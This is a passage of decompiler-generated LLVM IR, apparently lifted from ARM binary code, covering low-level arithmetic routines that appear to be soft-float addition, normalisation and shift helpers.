.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1cb8c = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1cb8c, i32 ptrtoint (i32* @global_var_1cdc4.1388 to i32))
  %v0_1cb90 = load i32, i32* %r4.global-to-local, align 4
  %v3_1cb90 = udiv i32 %v0_1cb90, 2097152
  store i32 %v3_1cb90, i32* %r4.global-to-local, align 4
  %v1_1cb94 = load i32, i32* %r5.global-to-local, align 4
  %v4_1cb94 = udiv i32 %v1_1cb94, 2097152
  %v5_1cb94 = sub nsw i32 %v4_1cb94, %v3_1cb90
  %v5_1cb98 = icmp ult i32 %v4_1cb94, %v3_1cb90
  br i1 %v5_1cb98, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1cb98 = sub nsw i32 0, %v5_1cb94
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1cb98, %bb13 ], [ %v5_1cb94, %.thread3 ]
  %v0_1cbbc = phi i32 [ %v7_1cb98, %bb13 ], [ %v5_1cb94, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1cb9c = icmp ugt i32 %v4_1cb94, %v3_1cb90
  br i1 %v7_1cb9c, label %dec_label_pc_1cba0, label %dec_label_pc_1cbbc

dec_label_pc_1cba0:                               ; preds = %bb14
  %v2_1cba0 = add nsw i32 %v0_1cbbc, %v3_1cb90
  store i32 %v2_1cba0, i32* %r4.global-to-local, align 4
  %v0_1cba4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1cba4 = load i32, i32* %r2.global-to-local, align 4
  %v0_1cba8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cba8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1cba4, i32* %r0.global-to-local, align 4
  store i32 %v1_1cba8, i32* %r1.global-to-local, align 4
  store i32 %v0_1cba4, i32* %r2.global-to-local, align 4
  store i32 %v0_1cba8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cbbc

dec_label_pc_1cbbc:                               ; preds = %bb14, %dec_label_pc_1cba0
  %tmp18 = icmp ugt i32 %v0_1cbbc, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1cbbc
  %v6_1cbc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1cbc0, i32* %r4.global-to-local, align 4
  store i32 %v6_1cb68, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1cbbc, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1cb68)
  %v0_1cbc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_1cbc8 = icmp sgt i32 %v0_1cbc8, -1
  %v4_1cbd4 = urem i32 %v0_1cbc8, 1048576
  %v5_1cbd4 = or i32 %v4_1cbd4, 1048576
  store i32 %v5_1cbd4, i32* %r1.global-to-local, align 4
  br i1 %v3_1cbc8, label %dec_label_pc_1cbe4, label %dec_label_pc_1cbdc

dec_label_pc_1cbdc:                               ; preds = %bb16
  %v0_1cbdc = load i32, i32* %r0.global-to-local, align 4
  %v1_1cbdc = sub i32 0, %v0_1cbdc
  store i32 %v1_1cbdc, i32* %r0.global-to-local, align 4
  %v2_1cbdc = icmp eq i32 %v0_1cbdc, 0
  %v2_1cbe0 = icmp eq i1 %v2_1cbdc, false
  %v5_1cbe0 = sext i1 %v2_1cbe0 to i32
  %v6_1cbe0 = sub nsw i32 %v5_1cbe0, %v5_1cbd4
  store i32 %v6_1cbe0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1cbe4

dec_label_pc_1cbe4:                               ; preds = %bb16, %dec_label_pc_1cbdc
  %v0_1cbe4 = load i32, i32* %r3.global-to-local, align 4
  %v3_1cbe4 = icmp sgt i32 %v0_1cbe4, -1
  %v4_1cbec = urem i32 %v0_1cbe4, 1048576
  %v5_1cbec = or i32 %v4_1cbec, 1048576
  store i32 %v5_1cbec, i32* %r3.global-to-local, align 4
  br i1 %v3_1cbe4, label %dec_label_pc_1cbfc, label %dec_label_pc_1cbf4

dec_label_pc_1cbf4:                               ; preds = %dec_label_pc_1cbe4
  %v0_1cbf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1cbf4 = sub i32 0, %v0_1cbf4
  store i32 %v1_1cbf4, i32* %r2.global-to-local, align 4
  %v2_1cbf4 = icmp eq i32 %v0_1cbf4, 0
  %v2_1cbf8 = icmp eq i1 %v2_1cbf4, false
  %v5_1cbf8 = sext i1 %v2_1cbf8 to i32
  %v6_1cbf8 = sub nsw i32 %v5_1cbf8, %v5_1cbec
  store i32 %v6_1cbf8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cbfc

dec_label_pc_1cbfc:                               ; preds = %dec_label_pc_1cbe4, %dec_label_pc_1cbf4
  %v0_1cbfc = load i32, i32* %r4.global-to-local, align 4
  %v1_1cbfc = load i32, i32* %r5.global-to-local, align 4
  %v4_1cbfc = icmp eq i32 %v1_1cbfc, %v0_1cbfc
  call void @__pseudo_cond_branch(i1 %v4_1cbfc, i32 ptrtoint (i32* @global_var_1cdac.1389 to i32))
  %v1_1cc00 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1cc00

; uselistorder directives
  uselistorder i32 %v0_1cbe4, { 1, 0 }
  uselistorder i32 %v0_1cbc8, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1cb94, { 2, 1, 0 }
  uselistorder i32 %v3_1cb90, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1cb78, { 1, 0 }
  uselistorder i32 %v2_1cb70, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1cb6c, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1cbfc, { 1, 0 }
  uselistorder label %dec_label_pc_1cbe4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1cbbc, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1cc04() local_unnamed_addr {
dec_label_pc_1cc04:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1cc04 = load i32, i32* @r4, align 4
  %v1_1cc04 = add i32 %v0_1cc04, -1
  store i32 %v1_1cc04, i32* @r4, align 4
  %v0_1cc08 = load i32, i32* @r5, align 4
  %v1_1cc08 = sub i32 32, %v0_1cc08
  store i32 %v1_1cc08, i32* @lr, align 4
  %v5_1cc0c = icmp sgt i32 %v0_1cc08, 32
  br i1 %v5_1cc0c, label %dec_label_pc_1cc28, label %dec_label_pc_1cc10

dec_label_pc_1cc10:                               ; preds = %dec_label_pc_1cc04
  %v0_1cc10 = load i32, i32* @r2, align 4
  %v6_1cc10 = shl i32 %v0_1cc10, %v1_1cc08
  store i32 %v6_1cc10, i32* %ip.global-to-local, align 4
  %v0_1cc14 = load i32, i32* @r0, align 4
  %v3_1cc14 = add i32 %v0_1cc08, -1
  %v4_1cc14 = shl i32 1, %v3_1cc14
  %v7_1cc14 = lshr i32 %v0_1cc10, %v0_1cc08
  %v8_1cc14 = add i32 %v0_1cc14, %v7_1cc14
  %v9_1cc14 = icmp ult i32 %v8_1cc14, %v0_1cc14
  %v0_1cc18 = load i32, i32* @r1, align 4
  %v2_1cc18 = zext i1 %v9_1cc14 to i32
  %v3_1cc18 = add i32 %v2_1cc18, %v0_1cc18
  %v1_1cc1c = load i32, i32* @r3, align 4
  %v7_1cc1c = shl i32 %v1_1cc1c, %v1_1cc08
  %v8_1cc1c = add i32 %v7_1cc1c, %v8_1cc14
  store i32 %v8_1cc1c, i32* %r0.global-to-local, align 4
  %v5_1cc20 = and i32 %v1_1cc1c, %v4_1cc14
  %v6_1cc20 = icmp ne i32 %v5_1cc20, 0
  %v7_1cc20 = ashr i32 %v1_1cc1c, %v0_1cc08
  %v9_1cc20 = add i32 %v3_1cc18, %v7_1cc20
  %v10_1cc20 = zext i1 %v6_1cc20 to i32
  %v11_1cc20 = add i32 %v10_1cc20, %v9_1cc20
  br label %dec_label_pc_1cc44

dec_label_pc_1cc28:                               ; preds = %dec_label_pc_1cc04
  %v1_1cc28 = add i32 %v0_1cc08, -32
  %v1_1cc2c = add i32 %v1_1cc08, 32
  store i32 %v1_1cc2c, i32* @lr, align 4
  %v0_1cc34 = load i32, i32* @r3, align 4
  %v2_1cc34 = add i32 %v1_1cc08, 31
  %v3_1cc34 = lshr i32 -2147483648, %v2_1cc34
  %v4_1cc34 = and i32 %v0_1cc34, %v3_1cc34
  %v5_1cc34 = icmp ne i32 %v4_1cc34, 0
  %v6_1cc34 = shl i32 %v0_1cc34, %v1_1cc2c
  %v2_1cc38 = or i32 %v6_1cc34, 2
  %v2_1cc38.v6_1cc34 = select i1 %v5_1cc34, i32 %v2_1cc38, i32 %v6_1cc34
  store i32 %v2_1cc38.v6_1cc34, i32* %ip.global-to-local, align 4
  %v0_1cc3c = load i32, i32* @r0, align 4
  %v7_1cc3c = ashr i32 %v0_1cc34, %v1_1cc28
  %v8_1cc3c = add i32 %v0_1cc3c, %v7_1cc3c
  store i32 %v8_1cc3c, i32* %r0.global-to-local, align 4
  %v0_1cc40 = load i32, i32* @r1, align 4
  %v2_1cc40 = and i32 %v0_1cc34, 1073741824
  %v3_1cc40 = icmp ne i32 %v2_1cc40, 0
  %v4_1cc40 = ashr i32 %v0_1cc34, 31
  %v6_1cc40 = add i32 %v0_1cc40, %v4_1cc40
  %v7_1cc40 = zext i1 %v3_1cc40 to i32
  %v8_1cc40 = add i32 %v6_1cc40, %v7_1cc40
  br label %dec_label_pc_1cc44

dec_label_pc_1cc44:                               ; preds = %dec_label_pc_1cc10, %dec_label_pc_1cc28
  %storemerge = phi i32 [ %v11_1cc20, %dec_label_pc_1cc10 ], [ %v8_1cc40, %dec_label_pc_1cc28 ]
  %v0_1cc44 = phi i32 [ %v11_1cc20, %dec_label_pc_1cc10 ], [ %v8_1cc40, %dec_label_pc_1cc28 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1cc44 = and i32 %v0_1cc44, -2147483648
  store i32 %v1_1cc44, i32* @r5, align 4
  %v1_1cc48 = icmp sgt i32 %v0_1cc44, -1
  call void @__pseudo_cond_branch(i1 %v1_1cc48, i32 ptrtoint (i32* @global_var_1cc58.1390 to i32))
  %v0_1cc4c = load i32, i32* %ip.global-to-local, align 4
  %v1_1cc4c = sub i32 0, %v0_1cc4c
  store i32 %v1_1cc4c, i32* %ip.global-to-local, align 4
  %v2_1cc4c = icmp eq i32 %v0_1cc4c, 0
  %v0_1cc50 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cc50 = icmp eq i1 %v2_1cc4c, false
  %v5_1cc50 = sext i1 %v2_1cc50 to i32
  %v6_1cc50 = sub i32 %v5_1cc50, %v0_1cc50
  store i32 %v6_1cc50, i32* %r0.global-to-local, align 4
  %v7_1cc50 = zext i1 %v2_1cc50 to i32
  %v8_1cc50 = icmp ne i32 %v6_1cc50, %v7_1cc50
  %v9_1cc50 = icmp ne i32 %v0_1cc50, -1
  %v10_1cc50 = or i1 %v9_1cc50, %v8_1cc50
  %v11_1cc50 = icmp ne i32 %v0_1cc50, 0
  %v12_1cc50 = select i1 %v2_1cc50, i1 %v10_1cc50, i1 %v11_1cc50
  %v0_1cc54 = load i32, i32* %r1.global-to-local, align 4
  %v5_1cc54 = sext i1 %v12_1cc50 to i32
  %v6_1cc54 = sub i32 %v5_1cc54, %v0_1cc54
  store i32 %v6_1cc54, i32* @r1, align 4
  ret i32 %v6_1cc50

; uselistorder directives
  uselistorder i1 %v2_1cc50, { 1, 2, 0 }
  uselistorder i32 %v0_1cc50, { 1, 2, 0 }
  uselistorder i32 %v8_1cc40, { 1, 0 }
  uselistorder i32 %v0_1cc34, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1cc20, { 1, 0 }
  uselistorder i32 %v1_1cc1c, { 1, 0, 2 }
  uselistorder i32 %v0_1cc14, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1cc44, { 1, 0 }
}

define i32 @function_1cc58(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1cc58:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1cc58 = load i32, i32* %r1.global-to-local, align 4
  %v3_1cc5c = icmp ult i32 %v0_1cc58, 1048574
  br i1 %v3_1cc5c, label %dec_label_pc_1cca0, label %dec_label_pc_1cc60

dec_label_pc_1cc60:                               ; preds = %dec_label_pc_1cc58
  %v3_1cc64 = icmp ult i32 %v0_1cc58, 2097150
  br i1 %v3_1cc64, label %dec_label_pc_1cc84, label %dec_label_pc_1cc68

dec_label_pc_1cc68:                               ; preds = %dec_label_pc_1cc60
  %v1_1cc68 = urem i32 %v0_1cc58, 2
  %v2_1cc68 = icmp ne i32 %v1_1cc68, 0
  %v3_1cc68 = udiv i32 %v0_1cc58, 2
  store i32 %v3_1cc68, i32* %r1.global-to-local, align 4
  %v0_1cc6c = load i32, i32* %r0.global-to-local, align 4
  %v3_1cc6c = zext i1 %v2_1cc68 to i32
  %v6_1cc6c = zext i32 %v0_1cc6c to i64
  %v7_1cc6c = sub i32 33, %v0_1cc6c
  %v8_1cc6c = zext i32 %v7_1cc6c to i64
  %v9_1cc6c = shl i64 %v6_1cc6c, %v8_1cc6c
  %v10_1cc6c = sub i32 32, %v0_1cc6c
  %v11_1cc6c = shl i32 %v3_1cc6c, %v10_1cc6c
  %v12_1cc6c = zext i32 %v11_1cc6c to i64
  %v14_1cc6c = or i64 %v12_1cc6c, %v9_1cc6c
  %v15_1cc6c = trunc i64 %v14_1cc6c to i32
  %v16_1cc6c = add i32 %v0_1cc6c, -1
  %v17_1cc6c = shl i32 1, %v16_1cc6c
  %v18_1cc6c = and i32 %v17_1cc6c, %v0_1cc6c
  %v19_1cc6c = icmp ne i32 %v18_1cc6c, 0
  store i32 %v15_1cc6c, i32* %r0.global-to-local, align 4
  %v0_1cc70 = load i32, i32* @ip, align 4
  %v3_1cc70 = zext i1 %v19_1cc6c to i32
  %v6_1cc70 = zext i32 %v0_1cc70 to i64
  %v7_1cc70 = sub i32 33, %v0_1cc70
  %v8_1cc70 = zext i32 %v7_1cc70 to i64
  %v9_1cc70 = shl i64 %v6_1cc70, %v8_1cc70
  %v10_1cc70 = sub i32 32, %v0_1cc70
  %v11_1cc70 = shl i32 %v3_1cc70, %v10_1cc70
  %v12_1cc70 = zext i32 %v11_1cc70 to i64
  %v14_1cc70 = or i64 %v12_1cc70, %v9_1cc70
  %v15_1cc70 = trunc i64 %v14_1cc70 to i32
  store i32 %v15_1cc70, i32* @ip, align 4
  %v0_1cc74 = load i32, i32* @r4, align 4
  %v1_1cc74 = add i32 %v0_1cc74, 1
  store i32 %v1_1cc74, i32* @r4, align 4
  %v3_1cc78 = mul i32 %v1_1cc74, 2097152
  %v2_1cc7c = icmp ugt i32 %v3_1cc78, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1cc7c, i32 ptrtoint (i32* @global_var_1ce34.1391 to i32))
  br label %dec_label_pc_1cc84

dec_label_pc_1cc84:                               ; preds = %dec_label_pc_1cca0, %dec_label_pc_1cc60, %dec_label_pc_1cc68
  %v0_1cc84 = load i32, i32* @ip, align 4
  %v2_1cc84 = icmp slt i32 %v0_1cc84, 0
  %v6_1cc84 = icmp eq i32 %v0_1cc84, -2147483648
  %v1_1cc88 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1cc84, label %bb, label %dec_label_pc_1cc84._crit_edge

bb:                                               ; preds = %dec_label_pc_1cc84
  %v2_1cc88 = urem i32 %v1_1cc88, 2
  %v3_1cc88 = icmp ne i32 %v2_1cc88, 0
  br label %dec_label_pc_1cc84._crit_edge

dec_label_pc_1cc84._crit_edge:                    ; preds = %dec_label_pc_1cc84, %bb
  %v1_1cc8c = phi i1 [ %v3_1cc88, %bb ], [ %v2_1cc84, %dec_label_pc_1cc84 ]
  %v2_1cc8c = zext i1 %v1_1cc8c to i32
  %v3_1cc8c = add i32 %v2_1cc8c, %v1_1cc88
  store i32 %v3_1cc8c, i32* %r0.global-to-local, align 4
  %v0_1cc90 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cc90 = load i32, i32* @r4, align 4
  %v2_1cc90 = and i32 %v1_1cc90, 4096
  %v3_1cc90 = icmp ne i32 %v2_1cc90, 0
  %v4_1cc90 = mul i32 %v1_1cc90, 1048576
  %v6_1cc90 = add i32 %v4_1cc90, %v0_1cc90
  %v7_1cc90 = zext i1 %v3_1cc90 to i32
  %v8_1cc90 = add i32 %v7_1cc90, %v6_1cc90
  %v1_1cc94 = load i32, i32* @r5, align 4
  %v2_1cc94 = or i32 %v1_1cc94, %v8_1cc90
  store i32 %v2_1cc94, i32* %r1.global-to-local, align 4
  ret i32 %v3_1cc8c

dec_label_pc_1cca0:                               ; preds = %dec_label_pc_1cc58
  %v0_1cca0 = load i32, i32* @ip, align 4
  %v1_1cca0 = icmp slt i32 %v0_1cca0, 0
  %v2_1cca0 = mul i32 %v0_1cca0, 2
  store i32 %v2_1cca0, i32* @ip, align 4
  %v0_1cca4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1cca4 = mul i32 %v0_1cca4, 2
  %v4_1cca4 = zext i1 %v1_1cca0 to i32
  %v5_1cca4 = or i32 %v3_1cca4, %v4_1cca4
  store i32 %v5_1cca4, i32* %r0.global-to-local, align 4
  %v9_1cca4 = icmp ule i32 %v5_1cca4, %v0_1cca4
  %v10_1cca4 = icmp ult i32 %v3_1cca4, %v0_1cca4
  %v11_1cca4 = select i1 %v1_1cca0, i1 %v9_1cca4, i1 %v10_1cca4
  %v3_1cca8 = mul i32 %v0_1cc58, 2
  %v4_1cca8 = zext i1 %v11_1cca4 to i32
  %v5_1cca8 = or i32 %v4_1cca8, %v3_1cca8
  store i32 %v5_1cca8, i32* %r1.global-to-local, align 4
  %v1_1ccac = and i32 %v3_1cca8, 1048576
  %v2_1ccac = icmp eq i32 %v1_1ccac, 0
  %v0_1ccb0 = load i32, i32* @r4, align 4
  %v1_1ccb0 = add i32 %v0_1ccb0, -1
  store i32 %v1_1ccb0, i32* @r4, align 4
  br i1 %v2_1ccac, label %bb7, label %dec_label_pc_1cc84

bb7:                                              ; preds = %dec_label_pc_1cca0
  ret i32 %v5_1cca4

; uselistorder directives
  uselistorder i32 %v0_1cca4, { 1, 2, 0 }
  uselistorder i1 %v1_1cca0, { 1, 0 }
  uselistorder i32 %v1_1cc88, { 1, 0 }
  uselistorder i32 %v0_1cc84, { 1, 0 }
  uselistorder i32 %v0_1cc70, { 1, 0, 2 }
  uselistorder i32 %v0_1cc6c, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1cc84._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1cc84, { 0, 2, 1 }
}

define i32 @function_1ccb8() local_unnamed_addr {
dec_label_pc_1ccb8:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1ccb8 = load i32, i32* @r1, align 4
  %v2_1ccb8 = icmp eq i32 %v0_1ccb8, 0
  br i1 %v2_1ccb8, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1ccb8
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1ccb8
  %v1_1ccc410 = load i32, i32* @r0, align 4
  store i32 %v1_1ccc410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1cd20 = phi i32 [ %v0_1ccb8, %bb ], [ %v1_1ccc410, %bb38 ]
  %v1_1ccd8 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1ccd0 = icmp ugt i32 %v0_1cd20, 65535
  br i1 %v2_1ccd0, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1ccd4 = and i32 %v0_1cd20, 32768
  %v3_1ccd4 = icmp eq i32 %v2_1ccd4, 0
  %v4_1ccd4 = udiv i32 %v0_1cd20, 65536
  br i1 %v3_1ccd4, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1ccd8 = add nsw i32 %v1_1ccd8, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1cce4 = phi i32 [ %v1_1ccd8, %.thread ], [ %v1_1ccd8, %bb39 ], [ %v2_1ccd8, %bb40 ]
  %v1_1cce0 = phi i32 [ %v0_1cd20, %.thread ], [ %v4_1ccd4, %bb39 ], [ %v4_1ccd4, %bb40 ]
  %v2_1ccdc = icmp ugt i32 %v1_1cce0, 255
  br i1 %v2_1ccdc, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1cce0 = and i32 %v1_1cce0, 128
  %v3_1cce0 = icmp eq i32 %v2_1cce0, 0
  %v4_1cce0 = udiv i32 %v1_1cce0, 256
  br i1 %v3_1cce0, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1cce4 = add nsw i32 %v1_1cce4, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1ccf0 = phi i32 [ %v1_1cce4, %.thread3 ], [ %v1_1cce4, %bb41 ], [ %v2_1cce4, %bb42 ]
  %v1_1ccec = phi i32 [ %v1_1cce0, %.thread3 ], [ %v4_1cce0, %bb41 ], [ %v4_1cce0, %bb42 ]
  %v2_1cce8 = icmp ugt i32 %v1_1ccec, 15
  br i1 %v2_1cce8, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1ccec = and i32 %v1_1ccec, 8
  %v3_1ccec = icmp eq i32 %v2_1ccec, 0
  %v4_1ccec = udiv i32 %v1_1ccec, 16
  br i1 %v3_1ccec, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1ccf0 = add nsw i32 %v1_1ccf0, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1ccf8 = phi i32 [ %v1_1ccf0, %.thread4 ], [ %v1_1ccf0, %bb43 ], [ %v2_1ccf0, %bb44 ]
  %v1_1cd00 = phi i32 [ %v1_1ccec, %.thread4 ], [ %v4_1ccec, %bb43 ], [ %v4_1ccec, %bb44 ]
  %v2_1ccf4 = icmp ugt i32 %v1_1cd00, 3
  br i1 %v2_1ccf4, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1ccf8 = add i32 %v1_1ccf8, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1ccfc = udiv i32 %v1_1cd00, 2
  %v6_1ccfc = sub i32 %v1_1ccf8, %v5_1ccfc
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1cd00 = phi i32 [ %v6_1ccfc, %.thread6 ], [ %v2_1ccf8, %bb45 ]
  %v4_1cd00 = udiv i32 %v1_1cd00, 8
  %v5_1cd00 = sub i32 %v0_1cd00, %v4_1cd00
  %v2_1cd04 = add i32 %v5_1cd00, -32
  %v4_1cd04 = sub i32 31, %v5_1cd00
  %v5_1cd04 = and i32 %v4_1cd04, %v5_1cd00
  %v8_1cd04 = icmp eq i32 %v5_1cd00, 32
  %v6_1cd08 = icmp slt i32 %v5_1cd00, 32
  br i1 %v6_1cd08, label %dec_label_pc_1cd0c, label %dec_label_pc_1cd2c

dec_label_pc_1cd0c:                               ; preds = %bb46
  %v2_1cd0c = add i32 %v5_1cd00, -20
  %v7_1cd10 = icmp sgt i32 %v2_1cd04, -12
  br i1 %v7_1cd10, label %dec_label_pc_1cd14, label %dec_label_pc_1cd28

dec_label_pc_1cd14:                               ; preds = %dec_label_pc_1cd0c
  %v1_1cd18 = sub i32 32, %v5_1cd00
  %v6_1cd1c = shl i32 %v0_1cd20, %v5_1cd00
  store i32 %v6_1cd1c, i32* @r0, align 4
  %v6_1cd20 = lshr i32 %v0_1cd20, %v1_1cd18
  store i32 %v6_1cd20, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1cd28:                               ; preds = %dec_label_pc_1cd0c
  %v8_1cd0c = icmp eq i32 %v2_1cd0c, 0
  %v4_1cd0c = add i32 %v5_1cd00, 2147483616
  %v5_1cd0c = and i32 %v2_1cd0c, %v4_1cd0c
  br label %dec_label_pc_1cd2c

dec_label_pc_1cd2c:                               ; preds = %bb46, %dec_label_pc_1cd28
  %v1_1cd38.in = phi i32 [ %v2_1cd04, %bb46 ], [ %v2_1cd0c, %dec_label_pc_1cd28 ]
  %v6_1cd38 = phi i32 [ %v2_1cd04, %bb46 ], [ %v5_1cd00, %dec_label_pc_1cd28 ]
  %v2_1cd38.in = phi i32 [ %v5_1cd04, %bb46 ], [ %v5_1cd0c, %dec_label_pc_1cd28 ]
  %v0_1cd38 = phi i1 [ %v8_1cd04, %bb46 ], [ %v8_1cd0c, %dec_label_pc_1cd28 ]
  %v1_1cd38 = icmp slt i32 %v1_1cd38.in, 0
  %v2_1cd38 = icmp slt i32 %v2_1cd38.in, 0
  %v3_1cd2c = xor i1 %v2_1cd38, %v1_1cd38
  %v4_1cd2c = or i1 %v0_1cd38, %v3_1cd2c
  br i1 %v4_1cd2c, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1cd2c
  %v6_1cd2c = sub i32 32, %v6_1cd38
  store i32 %v6_1cd2c, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1cd2c, %bb47
  %v6_1cd30 = shl i32 %v0_1cd20, %v6_1cd38
  store i32 %v6_1cd30, i32* %r1.global-to-local, align 4
  br i1 %v4_1cd2c, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1cd34 = load i32, i32* @r0, align 4
  %v7_1cd34 = load i32, i32* @ip, align 4
  %v12_1cd34 = lshr i32 %v6_1cd34, %v7_1cd34
  %v13_1cd34 = or i32 %v12_1cd34, %v6_1cd30
  store i32 %v13_1cd34, i32* %r1.global-to-local, align 4
  %v11_1cd38 = shl i32 %v6_1cd34, %v6_1cd38
  store i32 %v11_1cd38, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1cd14, %bb49
  %v6_1cd40 = phi i32 [ %v6_1cd20, %dec_label_pc_1cd14 ], [ %v13_1cd34, %bb49 ], [ %v6_1cd30, %bb48 ]
  %v0_1cd3c = load i32, i32* @r4, align 4
  %v2_1cd3c = sub i32 %v0_1cd3c, %v5_1cd00
  store i32 %v2_1cd3c, i32* %r4.global-to-local, align 4
  %v4_1cd3c = xor i32 %v0_1cd3c, %v5_1cd00
  %v5_1cd3c = xor i32 %v2_1cd3c, %v0_1cd3c
  %v6_1cd3c = and i32 %v5_1cd3c, %v4_1cd3c
  %v7_1cd3c = icmp slt i32 %v6_1cd3c, 0
  %v8_1cd3c = icmp slt i32 %v2_1cd3c, 0
  %v5_1cd40 = icmp slt i32 %v0_1cd3c, %v5_1cd00
  br i1 %v5_1cd40, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1cd40 = mul i32 %v2_1cd3c, 1048576
  %v11_1cd40 = add i32 %v10_1cd40, %v6_1cd40
  %v7_1cd44 = load i32, i32* @r5, align 4
  %v8_1cd44 = or i32 %v7_1cd44, %v11_1cd40
  store i32 %v8_1cd44, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1cd4c = xor i1 %v8_1cd3c, %v7_1cd3c
  %v4_1cd4c = xor i1 %v3_1cd4c, true
  call void @__pseudo_cond_branch(i1 %v4_1cd4c, i32 %tmp33)
  %v0_1cd50 = load i32, i32* %r4.global-to-local, align 4
  %v2_1cd54 = sub i32 -32, %v0_1cd50
  store i32 %v2_1cd54, i32* %r4.global-to-local, align 4
  %v6_1cd58 = icmp sgt i32 %v0_1cd50, -32
  br i1 %v6_1cd58, label %dec_label_pc_1cd5c, label %dec_label_pc_1cd9c

dec_label_pc_1cd5c:                               ; preds = %.thread8
  %v1_1cd5c = add i32 %v2_1cd54, 12
  store i32 %v1_1cd5c, i32* %r4.global-to-local, align 4
  %v8_1cd60 = icmp sgt i32 %v1_1cd5c, 0
  br i1 %v8_1cd60, label %dec_label_pc_1cd80, label %dec_label_pc_1cd64

dec_label_pc_1cd64:                               ; preds = %dec_label_pc_1cd5c
  %v1_1cd64 = add i32 %v2_1cd54, 32
